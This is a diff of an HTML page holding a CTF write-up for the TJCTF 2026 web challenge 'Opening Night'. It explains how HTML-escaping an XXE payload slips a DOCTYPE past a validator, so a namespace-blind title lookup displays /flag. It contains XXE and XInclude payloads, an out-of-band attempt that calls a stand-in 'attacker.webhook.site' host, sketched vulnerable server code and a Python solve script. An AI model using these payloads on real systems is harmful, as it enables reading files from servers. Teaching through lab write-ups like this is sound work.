@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>TJCTF 2026: Opening Night — QA210</title>
-<meta name="description" content="TJCTF 2026 Opening Night — Web / SVG / Parser Differential walkthrough by QA210">
+<meta name="description" content="TJCTF 2026 Opening Night — Web / SVG / Parser Differential walkthrough by QA210. Exploiting a two-stage parsing pipeline where HTML-escaping bypasses the gatekeeper and entity expansion exfiltrates the flag. 3rd solve out of 12.">
 <meta name="author" content="QA210">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎭</text></svg>">
 <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
@@ -71,7 +71,7 @@ a:hover{color:var(--link-hover)}
 .page-hero .meta{color:var(--text-secondary);font-size:.875rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center}
 .page-hero .meta .sep{color:var(--text-muted)}
 
-.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem}
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1rem}
 .box-info-card .info-item .label{font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-muted);margin-bottom:2px;font-weight:600}
 .box-info-card .info-item .value{font-size:.95rem;font-weight:600;color:var(--text-primary)}
 
@@ -137,8 +137,8 @@ p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padd
   <nav>
     <a href="/">Home</a>
     <a href="/tjctf-2026/">TJCTF</a>
-    <a href="#">Tools</a>
-    <a href="#">About</a>
+    <a href="/htb/">HTB</a>
+    <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
   </nav>
   <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">☰</button>
 </header>
@@ -181,7 +181,8 @@ p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padd
   <div class="info-item"><div class="label">Challenge</div><div class="value">Opening Night</div></div>
   <div class="info-item"><div class="label">Category</div><div class="value" style="color:var(--accent-purple)">Web</div></div>
   <div class="info-item"><div class="label">CTF</div><div class="value">TJCTF 2026</div></div>
-  <div class="info-item"><div class="label">Solves</div><div class="value">~30</div></div>
+  <div class="info-item"><div class="label">Solves</div><div class="value" style="color:var(--accent-orange)">12</div></div>
+  <div class="info-item"><div class="label">Our Place</div><div class="value" style="color:var(--accent-green)">3rd</div></div>
   <div class="info-item"><div class="label">Flag</div><div class="value" style="color:var(--accent-green)">tjctf{y0ur_4r7w0rk...}</div></div>
 </div>
 
@@ -196,7 +197,7 @@ p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padd
 <!-- ══════════════════════════════════════════════════════════════════════ -->
 <h2 id="overview">Challenge Overview</h2>
 
-<p>The challenge presents a web gallery where users can upload SVG artwork. Each uploaded file is processed server-side: the SVG gets validated, and then metadata (title, description, dimensions) is extracted and displayed on the gallery page. The key observation is that the output renders into three specific HTML sinks:</p>
+<p>The challenge presents a web gallery where users can upload SVG artwork. Each uploaded file is processed server-side: the SVG gets validated by a gatekeeper, and then metadata (title, description, dimensions) is extracted by a label writer and displayed on the gallery page. The key observation is that the output renders into three specific HTML sinks:</p>
 
 <div class="code-block-wrapper">
   <div class="code-block-header"><span class="lang-label">html</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
@@ -205,7 +206,7 @@ p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padd
 &lt;dd&gt;700 x 160&lt;/dd&gt;</code></pre>
 </div>
 
-<p>The challenge description says <em>"The new gallery opens tonight."</em> Three hints are provided that point toward a two-stage parsing pipeline with a differential vulnerability between the stages. Understanding how each stage interprets the uploaded file is the crux of this challenge.</p>
+<p>The challenge description says <em>"The new gallery opens tonight."</em> Three hints are provided that point toward a two-stage parsing pipeline with a differential vulnerability between the stages. Understanding how each stage interprets the uploaded file is the crux of this challenge. With only 12 total solves, this was one of the harder web challenges in the CTF, requiring a creative combination of two distinct bugs rather than a single straightforward vulnerability.</p>
 
 <div class="callout callout-hint">
   <div class="callout-title">Hint 1</div>
@@ -222,13 +223,99 @@ p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padd
   <p>Don't look for hidden rooms, change how your art is "wrapped"! Payload must survive two interpretations: harmless text vs. XML.</p>
 </div>
 
-<!-- ══════════════════════════════════════════════════════════════════════ -->
-<h2 id="namespace">Bug: Namespace Confusion</h2>
+<p>Reading these hints together, a clear picture emerges:</p>
+<ul>
+  <li><strong>Hint 1</strong> tells us there are <strong>two processing stages</strong> with different strictness levels. The first is careful (validates properly), the second is sloppy (cuts corners).</li>
+  <li><strong>Hint 2</strong> reveals two bugs: the gatekeeper only checks the <em>top</em> of the file (not the full content), and the label writer uses a <strong>namespace-blind selector</strong> that matches <code>title</code>/<code>desc</code> regardless of their XML namespace.</li>
+  <li><strong>Hint 3</strong> is the breakthrough: the payload must be <strong>"wrapped"</strong> differently — harmless text to one stage, active XML to the other. This directly points to an encoding differential.</li>
+</ul>
 
-<p>The label parser extracts metadata by searching for elements named <code>title</code> and <code>desc</code> without verifying their XML namespace. This means we can inject elements with a fake namespace that the label writer will still match. The SVG validation stage accepts them because they belong to a different namespace and don't violate SVG structural rules.</p>
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="recon">Reconnaissance</h2>
+
+<p>Before attempting any exploit, we need to understand the full attack surface of the gallery application. Let's walk through the normal upload flow and observe how the server processes our input.</p>
+
+<h3 id="recon-upload">Normal Upload Flow</h3>
+
+<p>Uploading a minimal, valid SVG file:</p>
 
 <div class="code-block-wrapper">
-  <div class="code-block-header"><span class="lang-label">xml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <div class="code-header"><span class="lang-label">xml — normal.svg</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+  &lt;title&gt;My Artwork&lt;/title&gt;
+  &lt;desc&gt;A beautiful piece&lt;/desc&gt;
+  &lt;rect width="100%" height="100%" fill="#1a1a2e"/&gt;
+  &lt;text x="350" y="80" text-anchor="middle" fill="white" font-size="24"&gt;Hello World&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+</div>
+
+<p>The gallery page renders:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">html — rendered output</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;h2&gt;My Artwork&lt;/h2&gt;
+&lt;p&gt;A beautiful piece&lt;/p&gt;
+&lt;dd&gt;700 x 160&lt;/dd&gt;</code></pre>
+</div>
+
+<p>So the server extracts <code>&lt;title&gt;</code> → <code>&lt;h2&gt;</code>, <code>&lt;desc&gt;</code> → <code>&lt;p&gt;</code>, and dimensions → <code>&lt;dd&gt;</code>. The SVG image itself is also displayed. This confirms three output sinks we can potentially control.</p>
+
+<h3 id="recon-validation">Validation Behavior</h3>
+
+<p>Let's probe what the gatekeeper accepts and rejects. We test several malformed uploads:</p>
+
+<table>
+  <thead>
+    <tr><th>Test</th><th>Result</th><th>Inference</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Plain text file with <code>.svg</code> extension</td><td style="color:var(--accent-red)">Rejected</td><td>Content-type or structure is validated</td></tr>
+    <tr><td>SVG without <code>xmlns</code></td><td style="color:var(--accent-red)">Rejected</td><td>Requires proper SVG namespace</td></tr>
+    <tr><td>Valid SVG with <code>&lt;script&gt;</code> inside</td><td style="color:var(--accent-red)">Rejected</td><td>Blacklists dangerous elements</td></tr>
+    <tr><td>SVG with DOCTYPE declaration</td><td style="color:var(--accent-red)">Rejected</td><td>DOCTYPE is stripped or blocked</td></tr>
+    <tr><td>SVG with extra namespace elements</td><td style="color:var(--accent-green)">Accepted</td><td>Non-SVG namespaces are allowed</td></tr>
+    <tr><td>SVG with CDATA section</td><td style="color:var(--accent-green)">Accepted</td><td>CDATA passes through</td></tr>
+    <tr><td>SVG with HTML entities in title</td><td style="color:var(--accent-green)">Accepted &amp; decoded</td><td>html.unescape() is applied</td></tr>
+  </tbody>
+</table>
+
+<p>The critical findings: <strong>DOCTYPE declarations are rejected</strong>, but <strong>additional XML namespaces are allowed</strong>, and <strong>HTML entities are decoded</strong>. This immediately rules out straightforward XXE and points toward the namespace confusion + encoding differential approach.</p>
+
+<h3 id="recon-decode">The html.unescape() Discovery</h3>
+
+<p>One test reveals the second stage's behavior. We upload an SVG containing HTML entities in the title:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml — entity-test.svg</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+  &lt;title&gt;Test &amp;amp; Entity &amp;lt;script&amp;gt;&lt;/title&gt;
+  &lt;desc&gt;Testing decode&lt;/desc&gt;
+&lt;/svg&gt;</code></pre>
+</div>
+
+<p>The rendered output shows:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">output</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code>h2: 'Test & Entity &lt;script&gt;'</code></pre>
+</div>
+
+<p>The HTML entities <code>&amp;amp;</code> and <code>&amp;lt;</code> have been decoded — <code>&amp;amp;</code> became <code>&amp;</code> and <code>&amp;lt;</code> became a literal <code>&lt;script&gt;</code> tag. This proves the backend calls <code>html.unescape()</code> on the content before or during parsing. <strong>This is our attack vector.</strong></p>
+
+<div class="callout callout-success">
+  <div class="callout-title">Key Discovery</div>
+  <p>The server runs <code>html.unescape()</code> on the uploaded content before XML parsing. This means if we upload HTML-escaped XML, the gatekeeper sees harmless text, but after unescaping, the XML parser receives fully functional XML — including DOCTYPE and entity declarations.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="namespace">Bug 1: Namespace Confusion</h2>
+
+<p>Hint 2 tells us the label writer "takes the first title/desc it sees by name, ignoring true namespace." This means the metadata extraction uses a namespace-blind selector — likely Python's <code>ElementTree.find("title")</code> or an XPath like <code>//*[local-name()="title"]</code>.</p>
+
+<p>In XML, namespaces exist precisely to disambiguate elements with the same local name. A proper SVG parser should only match <code>{http://www.w3.org/2000/svg}title</code>, not <code>{urn:not-svg}title</code>. But the label writer doesn't check namespaces, so we can inject a <code>title</code> element in a fake namespace that the label parser will still match.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml — namespace-inject.svg</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
   <pre><code class="language-markup">&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
   &lt;metadata&gt;
     &lt;x:title xmlns:x="urn:not-svg"&gt;INJECTED_TITLE&lt;/x:title&gt;
@@ -247,16 +334,23 @@ p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padd
 p : 'INJECTED_DESC'</code></pre>
 </div>
 
-<p>This confirms the parser uses a namespace-blind selector — likely <code>find("title")</code> or <code>//*[local-name()="title"]</code>. We can control the label content freely, but this alone doesn't yield the flag. We need a way to introduce dynamic content expansion.</p>
+<p>Despite <code>&lt;x:title&gt;</code> belonging to the <code>urn:not-svg</code> namespace, the label parser matched it. The SVG validation also accepted it because non-SVG namespaced elements are permitted inside <code>&lt;metadata&gt;</code>. We now have full control over the label content — but this alone doesn't give us the flag. We need a way to introduce <strong>dynamic content expansion</strong> (reading a file from the server).</p>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Why Not Just Inject File Content Directly?</div>
+  <p>We control the label text, but we can only put static strings there. We need XML entity expansion to dynamically include file contents at parse time. But DOCTYPE declarations are blocked by the gatekeeper... or are they?</p>
+</div>
 
 <!-- ══════════════════════════════════════════════════════════════════════ -->
 <h2 id="dead-ends">Dead Ends</h2>
+
+<p>Before arriving at the correct solution, I explored every alternative attack vector. Documenting these failures is important — they demonstrate why the parser differential approach is the only viable path.</p>
 
 <h3 id="dead-doctype">Raw DOCTYPE Doesn't Expand</h3>
 <p>Since we control the label, the natural next step is XML entity expansion. We try uploading a document with an internal entity declaration:</p>
 
 <div class="code-block-wrapper">
-  <div class="code-block-header"><span class="lang-label">xml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <div class="code-block-header"><span class="lang-label">xml — attempt 1: internal entity (FAILED)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
   <pre><code class="language-markup">&lt;!DOCTYPE svg [
   &lt;!ENTITY e "ENTITY_OK"&gt;
 ]&gt;
@@ -274,52 +368,113 @@ p : 'INJECTED_DESC'</code></pre>
   <pre><code>h2: '&amp;e;'</code></pre>
 </div>
 
-<p>The entity reference <code>&amp;e;</code> is <strong>not expanded</strong>. The parser treats it as a literal string. This is a major trap that leads many solvers to conclude that entity expansion is simply impossible on this server.</p>
+<p>The entity reference <code>&amp;e;</code> is <strong>not expanded</strong> — it appears as a literal string. This is devastating and leads many solvers to conclude entity expansion is impossible. But we're just hitting the gatekeeper: the DOCTYPE is being stripped during validation, so the XML parser never sees the entity declaration.</p>
 
 <h3 id="dead-xxe">External XXE and XInclude Blocked</h3>
-<p>With internal entities failing, we explore alternative XXE vectors. Every one of them hits a wall:</p>
 
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml — attempt 2: external entity (FAILED)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;!DOCTYPE svg [
+  &lt;!ENTITY xxe SYSTEM "file:///flag"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;xxe;&lt;/x:title&gt;
+  &lt;/metadata&gt;
+&lt;/svg&gt;</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml — attempt 3: OOB XXE (FAILED)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;!DOCTYPE svg [
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.webhook.site/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  ...
+&lt;/svg&gt;</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml — attempt 4: XInclude (FAILED)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;
+      &lt;xi:include href="file:///flag" parse="text"/&gt;
+    &lt;/x:title&gt;
+  &lt;/metadata&gt;
+&lt;/svg&gt;</code></pre>
+</div>
+
+<p>Every external access vector fails:</p>
 <ul>
-  <li><strong>External Entity</strong> — <code>&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</code> returns nothing. File access via external entities is completely disabled.</li>
-  <li><strong>OOB Parameter Entities</strong> — We set up a listener on webhook.site and used parameter entity references to exfiltrate data. No callback was ever received, confirming outbound network access is blocked.</li>
-  <li><strong>XInclude</strong> — <code>&lt;xi:include href="file:///flag" parse="text"/&gt;</code> is not processed by the parser. XInclude support is not enabled.</li>
+  <li><strong>External Entity</strong> — File access via external entities is completely disabled.</li>
+  <li><strong>OOB Parameter Entities</strong> — No callback was ever received, confirming outbound network access is blocked.</li>
+  <li><strong>XInclude</strong> — Not processed by the parser. XInclude support is not enabled.</li>
 </ul>
-
-<p>External entity loading is comprehensively disabled. This is not a standard "read /flag with XXE" challenge.</p>
 
 <h3 id="dead-ssti">Not SSTI or Multipart Confusion</h3>
-<p>The hint about "wrapping" leads us to test content-type confusion:</p>
-
 <ul>
-  <li><strong>Multipart tricks</strong> — Sending both a text field and a file field, duplicate file parts, switching <code>Content-Transfer-Encoding</code> between base64 and quoted-printable. The application consistently uses the real file part and rejects base64-encoded content.</li>
-  <li><strong>SSTI</strong> — Uploading a label containing <code>{{7*7}}</code> or <code>${7*7}</code> results in the template expression being printed literally. No server-side template injection.</li>
+  <li><strong>Multipart tricks</strong> — The application consistently uses the real file part and rejects base64-encoded content.</li>
+  <li><strong>SSTI</strong> — <code>{{7*7}}</code>, <code>${7*7}</code> printed literally. No template injection.</li>
+  <li><strong>XSLeak</strong> — No information leakage through error messages or timing.</li>
 </ul>
 
-<p>Every straightforward attack vector fails. The solution requires a deeper understanding of the two-stage processing pipeline.</p>
+<p>Every straightforward attack vector fails. The solution requires understanding the <strong>two-stage processing pipeline</strong> at a deeper level.</p>
 
 <!-- ══════════════════════════════════════════════════════════════════════ -->
 <h2 id="breakthrough">Breakthrough: Parser Differential</h2>
 
-<p>Returning to Hint 3 — <em>"Payload must survive two interpretations: harmless text vs. XML"</em> — the key insight is that the two processing stages interpret the same data differently. The gatekeeper (stage 1) validates the upload, while the label writer (stage 2) parses it as XML. If we can make the same bytes look like harmless text to the gatekeeper but valid XML after decoding, we bypass the validation entirely.</p>
+<p>Returning to Hint 3 — <em>"Payload must survive two interpretations: harmless text vs. XML"</em> — we now have all the pieces. The question is: how can the same bytes be harmless text to one parser but valid XML to another?</p>
 
 <p>The breakthrough is HTML-encoding. If we HTML-escape the entire XML document before uploading, the gatekeeper sees only escaped text — no XML tags, no DOCTYPE, nothing suspicious. But the backend calls <code>html.unescape()</code> before passing the content to the XML parser, reconstructing the original XML with all its entity declarations intact.</p>
 
-<p>Consider this HTML-escaped document:</p>
+<p>Consider what happens when we HTML-escape an XML document:</p>
 
 <div class="code-block-wrapper">
-  <div class="code-block-header"><span class="lang-label">text</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
-  <pre><code>&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;700&amp;quot; height=&amp;quot;160&amp;quot;&amp;gt;
-  &amp;lt;metadata&amp;gt;
-    &amp;lt;x:title xmlns:x=&amp;quot;urn:not-svg&amp;quot;&amp;gt;WHOLE_TITLE&amp;lt;/x:title&amp;gt;
-  &amp;lt;/metadata&amp;gt;
-&amp;lt;/svg&amp;gt;</code></pre>
+  <div class="code-block-header"><span class="lang-label">Original XML (what we WANT the backend to see)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;!DOCTYPE svg [&lt;!ENTITY flag SYSTEM "file:///flag"&gt;]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;...&lt;/svg&gt;</code></pre>
 </div>
 
-<p>The gatekeeper inspects this and sees only escaped HTML entities — no XML structure, nothing to validate or reject. It lets the upload through. Then the backend performs <code>html.unescape()</code>, which reconstructs the original well-formed SVG document. The XML parser receives clean, valid XML and processes it normally.</p>
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">After html.escape() (what we ACTUALLY upload)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code>&amp;lt;!DOCTYPE svg [&amp;lt;!ENTITY flag SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;]&amp;gt;
+&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot;&amp;gt;...&amp;lt;/svg&amp;gt;</code></pre>
+</div>
+
+<p>After HTML-escaping, all <code>&lt;</code> become <code>&amp;lt;</code>, all <code>&gt;</code> become <code>&amp;gt;</code>, all <code>&amp;</code> become <code>&amp;amp;</code>. The gatekeeper inspects this and sees <strong>only escaped text</strong> — no XML structure, no DOCTYPE, nothing to validate or reject. The file passes through as harmless content.</p>
+
+<p>Then the backend performs <code>html.unescape()</code>, which reverses every HTML entity back to its original character. The XML parser receives the clean, unescaped document — complete with DOCTYPE and entity declarations — and processes it normally.</p>
 
 <div class="callout callout-info">
-  <div class="callout-title">Info — Parser Differential</div>
-  <p>This class of vulnerability occurs when two components process the same input differently. The gatekeeper treats the raw bytes as text (seeing no XML structure), while the label writer first unescapes and then parses as XML (seeing a complete document with entities). This gap is what makes the exploit possible.</p>
+  <div class="callout-title">Parser Differential — Formal Definition</div>
+  <p>A parser differential vulnerability occurs when two components process the same input differently due to different parsing rules, encoding assumptions, or processing stages. In this case, the gatekeeper treats the raw bytes as text (seeing no XML structure), while the label writer first unescapes and then parses as XML (seeing a complete document with entities). This semantic gap is the vulnerability.</p>
+</div>
+
+<h3 id="why-external-works">Why External Entities Work After Unescaping</h3>
+
+<p>The earlier failure happened because the <strong>gatekeeper was stripping the DOCTYPE</strong> before the XML parser ever saw it. The parser received a document without entity declarations, so <code>&amp;flag;</code> was treated as an undefined entity and rendered literally.</p>
+
+<p>Now, with the HTML-escape bypass, the gatekeeper <strong>never sees the DOCTYPE</strong> because it's hidden behind HTML entities. The <code>html.unescape()</code> step reconstructs the DOCTYPE after validation has already passed. The XML parser then receives the full document with entity declarations and expands them.</p>
+
+<p>The server likely uses <code>lxml.etree</code> with network resolution disabled but local file resolution enabled — a common misconfiguration that allows <code>file://</code> URIs in SYSTEM entities while blocking <code>http://</code>.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python — likely server code</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python"># Stage 1: Gatekeeper — validates raw upload
+raw = request.files['svg_file'].read()
+if has_doctype(raw):          # Checks for &lt;!DOCTYPE in raw bytes
+    reject("DOCTYPE not allowed")
+if not is_valid_svg(raw):     # Checks for &lt;svg&gt; tag structure
+    reject("Invalid SVG")
+
+# Stage 2: Label Writer — unescapes, then parses
+decoded = html.unescape(raw.decode())    # &amp;lt; → &lt;, &amp;amp; → &amp;, etc.
+tree = etree.fromstring(decoded)          # Now sees DOCTYPE + entities!
+title = tree.find(".//title")             # Namespace-blind search
+desc = tree.find(".//desc")</code></pre>
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════════════ -->
@@ -331,7 +486,7 @@ p : 'INJECTED_DESC'</code></pre>
 <p>The complete payload before HTML-escaping:</p>
 
 <div class="code-block-wrapper">
-  <div class="code-block-header"><span class="lang-label">xml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <div class="code-block-header"><span class="lang-label">xml — desired backend XML</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
   <pre><code class="language-markup">&lt;!DOCTYPE svg [
   &lt;!ENTITY flag SYSTEM "file:///flag"&gt;
 ]&gt;
@@ -346,15 +501,46 @@ p : 'INJECTED_DESC'</code></pre>
 &lt;/svg&gt;</code></pre>
 </div>
 
-<h3 id="exploit-flow">Exploit Flow</h3>
+<p>Breaking down every component:</p>
+<ul>
+  <li><strong><code>&lt;!DOCTYPE svg [&lt;!ENTITY flag SYSTEM "file:///flag"&gt;]&gt;</code></strong> — Declares an external entity named <code>flag</code> that reads the file <code>/flag</code>. This is the payload that the gatekeeper would normally reject.</li>
+  <li><strong><code>&lt;x:title xmlns:x="urn:not-svg"&gt;</code></strong> — Fake-namespace <code>title</code> element. The label parser will match this first due to document order, ignoring that it's not in the SVG namespace.</li>
+  <li><strong><code>&amp;flag;</code></strong> — Entity reference that will be expanded to the contents of <code>/flag</code> during XML parsing.</li>
+  <li><strong><code>&lt;title&gt;Safe Title&lt;/title&gt;</code></strong> — Legitimate SVG title as a fallback. The label parser won't reach this because it already matched the fake-namespace one.</li>
+  <li><strong><code>&lt;rect .../&gt;</code></strong> — Valid SVG content so the image renders normally.</li>
+</ul>
+
+<h3 id="apply-escape">Applying HTML-Escape</h3>
+<p>Now we HTML-escape the entire document. Every <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, and <code>"</code> gets converted to its HTML entity equivalent:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">text — what we actually upload</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code>&amp;lt;!DOCTYPE svg [
+  &amp;lt;!ENTITY flag SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;
+]&amp;gt;
+&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;700&amp;quot; height=&amp;quot;160&amp;quot;&amp;gt;
+  &amp;lt;metadata&amp;gt;
+    &amp;lt;x:title xmlns:x=&amp;quot;urn:not-svg&amp;quot;&amp;gt;&amp;amp;flag;&amp;lt;/x:title&amp;gt;
+    &amp;lt;x:desc xmlns:x=&amp;quot;urn:not-svg&amp;quot;&amp;gt;Opening Night Gallery&amp;lt;/x:desc&amp;gt;
+  &amp;lt;/metadata&amp;gt;
+  &amp;lt;title&amp;gt;Safe Title&amp;lt;/title&amp;gt;
+  &amp;lt;desc&amp;gt;Safe Description&amp;lt;/desc&amp;gt;
+  &amp;lt;rect width=&amp;quot;100%&amp;quot; height=&amp;quot;100%&amp;quot; fill=&amp;quot;white&amp;quot;/&amp;gt;
+&amp;lt;/svg&amp;gt;</code></pre>
+</div>
+
+<p>Pay special attention to <code>&amp;amp;flag;</code> — this is the HTML-escaped form of <code>&amp;flag;</code>. After <code>html.unescape()</code>, <code>&amp;amp;</code> becomes <code>&amp;</code>, so the XML parser sees <code>&amp;flag;</code>, which it then expands as an entity reference.</p>
+
+<h3 id="exploit-flow">Complete Exploit Flow</h3>
 <ol>
-  <li><strong>HTML-escape</strong> the entire XML document above — every <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, and quote character gets converted to its HTML entity equivalent.</li>
+  <li><strong>HTML-escape</strong> the entire XML document — every <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, and quote character gets converted to its HTML entity equivalent.</li>
   <li><strong>Upload</strong> the escaped content as <code>image/svg+xml</code>.</li>
-  <li><strong>Gatekeeper</strong> sees only escaped text — no XML structure, passes validation.</li>
-  <li><strong>Backend</strong> calls <code>html.unescape()</code> on the stored content before parsing.</li>
-  <li><strong>XML parser</strong> receives the clean document with <code>DOCTYPE</code> and entity declarations.</li>
-  <li><strong>Entity expansion</strong> — <code>&amp;flag;</code> resolves to the contents of <code>/flag</code>.</li>
-  <li><strong>Label parser</strong> extracts the expanded entity value as the title.</li>
+  <li><strong>Gatekeeper</strong> inspects the raw bytes — sees only <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;amp;</code> sequences. No <code>&lt;!DOCTYPE</code> pattern. No <code>&lt;svg&gt;</code> tag. Passes validation as harmless text.</li>
+  <li><strong>Backend</strong> calls <code>html.unescape()</code> — all HTML entities are decoded back to their original characters. The full XML document is reconstructed.</li>
+  <li><strong>XML parser</strong> receives the clean document with <code>&lt;!DOCTYPE svg [&lt;!ENTITY flag SYSTEM "file:///flag"&gt;]&gt;</code> and processes the entity declaration.</li>
+  <li><strong>Entity expansion</strong> — <code>&amp;flag;</code> resolves to the contents of <code>/flag</code> on the server's filesystem.</li>
+  <li><strong>Label parser</strong> extracts the expanded entity value via namespace-blind <code>find("title")</code> match and renders it in the <code>&lt;h2&gt;</code> tag.</li>
+  <li><strong>Flag</strong> appears in the gallery page output.</li>
 </ol>
 
 <div class="callout callout-success">
@@ -366,12 +552,12 @@ p : 'INJECTED_DESC'</code></pre>
 <h2 id="exploit-code">Exploit Code</h2>
 
 <div class="code-block-wrapper">
-  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <div class="code-block-header"><span class="lang-label">python — solve.py</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
   <pre><code class="language-python">#!/usr/bin/env python3
 """
 TJCTF 2026 — Opening Night
 Parser Differential via HTML-escape → unescape → XML entity expansion
-Author: QA210
+Author: QA210  |  3rd solve / 12 total
 """
 import html
 import re
@@ -383,7 +569,18 @@ FLAG_PAT = re.compile(r"tjctf\{[^}]+\}", re.IGNORECASE)
 
 
 def craft_svg_payload():
-    """Build the raw XML with DOCTYPE + external entity, then HTML-escape it."""
+    """
+    Build the raw XML with DOCTYPE + external entity, then HTML-escape it.
+
+    The raw XML contains:
+    - DOCTYPE with SYSTEM entity pointing to /flag
+    - Fake-namespace title/desc that the label parser matches
+    - Entity reference &flag; in the fake-namespace title
+
+    After html.escape(), the gatekeeper sees only escaped text.
+    After html.unescape() on the backend, the XML parser sees the full
+    document and expands &flag; to the file contents.
+    """
     raw_xml = (
         '&lt;!DOCTYPE svg [\n'
         '  &lt;!ENTITY flag SYSTEM "file:///flag"&gt;\n'
@@ -406,11 +603,9 @@ def craft_svg_payload():
 def find_upload_endpoint(session):
     """Discover the upload form action and file field name."""
     r = session.get(f"{TARGET}/")
-    # Simple regex to find form action and input name
     action_m = re.search(r'action="([^"]*)"', r.text)
     field_m = re.search(r'name="([^"]*)".*type="file"', r.text)
     if not action_m or not field_m:
-        # Fallback: try common paths
         return f"{TARGET}/upload", "file"
     return f"{TARGET}{action_m.group(1)}", field_m.group(1)
 
@@ -437,7 +632,6 @@ def main():
         print(f"[+] FLAG: {match.group(0)}")
     else:
         print("[-] Flag not found in response.")
-        # Debug: show snippet
         for line in resp.text.splitlines():
             if "title" in line.lower() or "flag" in line.lower():
                 print(f"    {line.strip()}")
@@ -459,11 +653,28 @@ if __name__ == "__main__":
 [+] FLAG: tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}</code></pre>
 </div>
 
